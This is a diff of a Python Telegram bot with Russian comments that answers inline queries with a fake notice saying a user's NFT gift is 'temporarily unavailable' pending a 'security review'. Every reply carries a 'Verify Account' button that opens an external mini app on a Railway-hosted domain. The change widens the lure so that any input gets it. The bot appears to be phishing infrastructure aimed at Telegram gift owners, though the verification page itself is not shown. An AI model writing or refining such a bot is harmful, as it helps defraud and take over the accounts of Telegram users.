@@ -19,7 +19,7 @@ PHOTO_URL = "https://i.postimg.cc/hPNrFrmg/IMG-4180.jpg"
 # ССЫЛКА НА MINI APP
 MINI_APP_URL = "https://verifing-production.up.railway.app"
 
-# Команда /start
+# ===== КОМАНДА /start =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
@@ -46,14 +46,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.inline_query.query.strip()
     
-    # ⚡ ЕСЛИ НИЧЕГО НЕ ВВЕДЕНО - ПОКАЗЫВАЕМ ТЕКСТ С ❄️
+    logger.info(f"📥 Инлайн-запрос: '{query}'")
+    
+    # КНОПКА ДЛЯ ВСЕХ РЕЗУЛЬТАТОВ
+    keyboard = [
+        [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    # ЕСЛИ НИЧЕГО НЕ ВВЕДЕНО - ПОКАЗЫВАЕМ ПРИМЕР
     if not query:
-        keyboard = [
-            [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        # ТЕКСТ С ❄️ (КАК ТЫ НАПИСАЛ)
         message = (
             f"❄️ *Gift temporarily unavailable*\n\n"
             f"*SpyAgaric-37522* is currently undergoing a security review.\n\n"
@@ -79,19 +81,10 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.inline_query.answer(results)
         return
     
-    # Проверяем ссылку
-    is_valid_link = re.match(r'^https?://t\.me/(nft|gift|portal)/', query)
-    
-    if is_valid_link or query.startswith('http'):
-        keyboard = [
-            [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+    # ЕСЛИ ВВЕДЕНА ССЫЛКА
+    if query.startswith('http') or re.match(r'^https?://t\.me/(nft|gift|portal)/', query):
+        gift_id = query.split('/')[-1] if '/' in query else 'Unknown'
         
-        # Извлекаем ID подарка из ссылки
-        gift_id = query.split('/')[-1] if '/' in query else 'JollyChimp-20203'
-        
-        # ТЕКСТ С ❄️ ДЛЯ КОНКРЕТНОЙ ССЫЛКИ
         message = (
             f"❄️ *Gift temporarily unavailable*\n\n"
             f"*{gift_id}* is currently undergoing a security review.\n\n"
@@ -115,22 +108,31 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         ]
         await update.inline_query.answer(results)
-        
-    else:
-        results = [
-            InlineQueryResultArticle(
-                id="1",
-                title="❌ Неверная ссылка",
-                description="Введите корректную ссылку на подарок",
-                input_message_content=InputTextMessageContent(
-                    "❌ Пожалуйста, введите корректную ссылку на подарок.\n\n"
-                    "Пример: `https://t.me/nft/JollyChimp-20203`"
-                )
-            )
-        ]
-        await update.inline_query.answer(results)
+        return
+    
+    # ЕСЛИ ВВЕДЕН НЕПОНЯТНЫЙ ТЕКСТ
+    message = (
+        f"❄️ *Gift temporarily unavailable*\n\n"
+        f"Please enter a valid gift link.\n\n"
+        f"Example: `https://t.me/nft/JollyChimp-20203`"
+    )
+    
+    results = [
+        InlineQueryResultArticle(
+            id="1",
+            title="❌ Invalid link",
+            description="Please enter a valid gift link",
+            input_message_content=InputTextMessageContent(
+                message_text=message,
+                parse_mode='Markdown'
+            ),
+            reply_markup=reply_markup,
+            thumb_url=PHOTO_URL
+        )
+    ]
+    await update.inline_query.answer(results)
 
-# Команда /help
+# ===== КОМАНДА /help =====
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 *Как использовать бота:*\n\n"
@@ -143,6 +145,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
+# ===== ЗАПУСК =====
 def main():
     application = Application.builder().token(TOKEN).build()
     
